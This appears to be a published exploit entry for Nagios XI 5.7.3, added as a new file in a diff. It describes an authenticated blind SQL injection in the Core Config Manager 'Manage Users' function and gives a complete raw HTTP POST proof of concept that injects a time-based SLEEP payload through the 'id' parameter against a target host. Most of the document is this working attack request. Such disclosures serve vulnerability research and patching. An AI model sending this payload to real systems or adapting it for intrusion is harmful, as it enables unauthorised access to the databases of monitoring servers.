@@ -1,0 +1,30 @@
+# Exploit Title: Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection
+# Date: 10-18-2020
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
+# Vendor Changelog: https://www.nagios.com/downloads/nagios-xi/change-log/
+# Software Link: https://www.nagios.com/downloads/nagios-xi/
+# Version: Nagios XI 5.7.3
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A blind SQL injection vulnerability exists in the "Manage Users" functionality of the Core Config Manager of Nagios XI.
+# Vulnerable Parameter : id
+
+
+# POC
+
+POST /nagiosxi/includes/components/ccm/index.php?type=user&page=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://TARGET/nagiosxi/includes/components/ccm/index.php?cmd=modify&type=user&id=2&page=1&returnUrl=index.php%3Fcmd%3Dadmin%26type%3Duser%26page%3D1
+Cookie: nagiosxi=a354rem56a8aoeieqr9k2le39i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 338
+
+username=test&alias=test&password=password&confirm=password&active=1&id=2+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))A)&cmd=admin&mode=modify&hidId=2&hidName=&hidServiceDescription=&hostAddress=127.0.0.1&exactType=user&type=user&genericType=user&returnUrl=index.php%3Fcmd%3Dadmin%26type%3Duser%26page%3D1&token=991611d98c6c8ea7d32c54522b346448
